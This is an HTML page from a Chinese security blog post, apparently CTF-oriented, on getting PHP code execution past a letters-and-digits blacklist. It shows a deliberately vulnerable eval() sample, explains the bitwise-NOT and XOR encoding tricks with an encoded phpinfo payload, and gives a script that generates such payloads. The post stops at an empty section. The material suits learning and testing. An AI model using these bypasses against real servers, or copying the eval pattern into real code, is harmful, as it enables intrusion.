@@ -1,0 +1,171 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>无字母数字RCE初探 | Fir3Linnの厨房</title><meta name="keywords" content="php - rce"><meta name="author" content="Fir3Linn"><meta name="copyright" content="Fir3Linn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="厨房扩建中没有blacklist的rce是没有灵魂的！ 有人说，说是有人在blacklist里下了毒（指&amp;#x2F;[a-zA-Z0-9]+&amp;#x2F; 害羞羞，你看你就会开玩笑（指绕过 本地写个青春版开冲 1234567&amp;lt;?phphighlight_file(__FILE__);$code &amp;#x3D; $_GET[&amp;amp;#"><link rel="shortcut icon" href="/"><link rel="canonical" href="http://example.com/2022/03/28/rce-without-w-and-n/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '无字母数字RCE初探',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-29 00:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/url(https:/cdn.jsdelivr.net/gh/Felidaessolution/cloud/202112051948952.jpg)" onerror="onerror=null;src='null'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 食物们</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-home"></i><span> 厨师宣言</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fir3Linnの厨房</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 食物们</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-home"></i><span> 厨师宣言</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无字母数字RCE初探</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-28T00:00:00.000Z" title="发表于 2022-03-28 00:00">2022-03-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-29T00:00:00.000Z" title="更新于 2022-03-29 00:00">2022-03-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Note/">Note</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="厨房扩建中"><a href="#厨房扩建中" class="headerlink" title="厨房扩建中"></a>厨房扩建中</h1><p>没有blacklist的rce是没有灵魂的！</p>
+<p>有人说，说是有人在blacklist里下了毒（指<code>/[a-zA-Z0-9]+/</code></p>
+<p>害羞羞，你看你就会开玩笑（指绕过</p>
+<p>本地写个青春版开冲</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="鸡汤来咯"><a href="#鸡汤来咯" class="headerlink" title="鸡汤来咯"></a>鸡汤来咯</h1><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p>
+<p>举个栗子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line">var_dump(~<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(-234)</span></span><br></pre></td></tr></table></figure>
+
+<p><code>233</code>的二进制表示</p>
+<p><code>0000000011101011</code></p>
+<p><code>-234</code>的二进制表示</p>
+<p><code>1111111100010100</code></p>
+<p>那么取反也就是字面意思，将每个二进制位上的各数字取相反数。</p>
+<p>对于字母而言，我们也就能通过其他字符加上取反操作得到我们想到的组合了。</p>
+<p>大部分情况下都会加上<code>urlencode()</code>，出现乱码总是很老火的说</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">var_dump(urlencode(~<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>（图）</p>
+<p>相信不止我一个人在刚接触这种姿势时认为，将<code>phpinfo();</code>这完整的函数进行取反不是能减少一些操作嘛，为什么要单独取反函数名再加上括号和分号呢？</p>
+<p>注意关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们传入的参数始终只会成为字符串。<code>eval()</code>函数执行的唯一操作<strong>仅仅</strong>是取反<code>~</code>，得到了构造出的<code>phpinfo</code>，它的任务就已经完成了。但再加上外部的括号后，得到的实际上是<code>(&#39;phpinfo&#39;)()</code>，在php7及以上版本中这种写法会被解析为函数，因此会执行后续的payload。分号作为一句完整代码的结束标志，就和平时写代码一样。</p>
+<p>我们将括号分号一齐加入取反的队伍，取反后得到了<code>phpinfo();</code>，看似没有多大差别，但我们要知道，这是一串字符串，只是一串字符串。于是就没有后续了。（悲</p>
+<p>试着写了个很挫的脚本 学习为主 轻喷（demo版 后面会继续升级的 这还不够智能 瘫</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Fir3Linn</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-3-28 21:48</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn($func1 [, $func2] [, $param])</span></span><br><span class="line">pwn(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;ini_get&#x27;</span>, <span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$func1</span>, <span class="variable">$func2</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$param</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$negat_func1</span> = ~<span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.urlencode(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.urlencode(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.urlencode(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)());&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$negat_param</span> = ~<span class="variable">$param</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.urlencode(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.urlencode(<span class="variable">$negat_param</span>).<span class="string">&#x27;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.urlencode(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.urlencode(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)((~&#x27;</span>.urlencode(<span class="variable">$negat_param</span>).<span class="string">&#x27;)));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>万恶之源 我很异或（疑惑）的出处</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">1</span>;  <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">0</span>;  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">0</span>^<span class="number">0</span>;  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
+
+<p>在php中两个字符串异或之后，得到的还是一个字符串。基于此我们也能做到无字母数字构造payload。</p>
+<p>选择异或的理由？同或不行吗？当然可以!</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>|<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># c</span></span><br></pre></td></tr></table></figure>
+
+<p>不过异或运算的一大特点是<strong>运算可逆</strong>，异或字符和被异或字符运算的结果能倒着异或回去得到相同的结果，相对同或来说，这为我们寻找payload提供了莫大的便利。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># @</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># a</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h1></article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php-rce/">php - rce</a></div><div class="post_share"></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%A8%E6%88%BF%E6%89%A9%E5%BB%BA%E4%B8%AD"><span class="toc-number">1.</span> <span class="toc-text">厨房扩建中</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%B8%A1%E6%B1%A4%E6%9D%A5%E5%92%AF"><span class="toc-number">2.</span> <span class="toc-text">鸡汤来咯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">2.1.</span> <span class="toc-text">取反</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">2.2.</span> <span class="toc-text">异或</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">3.</span> <span class="toc-text">自增</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/28/rce-without-w-and-n/" title="无字母数字RCE初探">无字母数字RCE初探</a><time datetime="2022-03-28T00:00:00.000Z" title="发表于 2022-03-28 00:00">2022-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/20/%5BVN2022%5DInterestingPHP/" title="VNCTF2022 InterestingPHP 复现">VNCTF2022 InterestingPHP 复现</a><time datetime="2022-03-20T00:00:00.000Z" title="发表于 2022-03-20 00:00">2022-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/09/computer-networks-basic/" title="域肾透——从看懂到看开 0x00">域肾透——从看懂到看开 0x00</a><time datetime="2022-03-09T00:00:00.000Z" title="发表于 2022-03-09 00:00">2022-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/03/%5Banxun2019%5Deasy-serialize-php/" title="安洵杯2019 easy_serialize_php">安洵杯2019 easy_serialize_php</a><time datetime="2022-03-03T00:00:00.000Z" title="发表于 2022-03-03 00:00">2022-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/26/%5Bjuanwang%5Deasy-unserialize/" title="卷王杯 easy unserialize | esay web">卷王杯 easy unserialize | esay web</a><time datetime="2022-02-26T00:00:00.000Z" title="发表于 2022-02-26 00:00">2022-02-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Fir3Linn</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">愿你有一天能和你最重要的人重逢</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
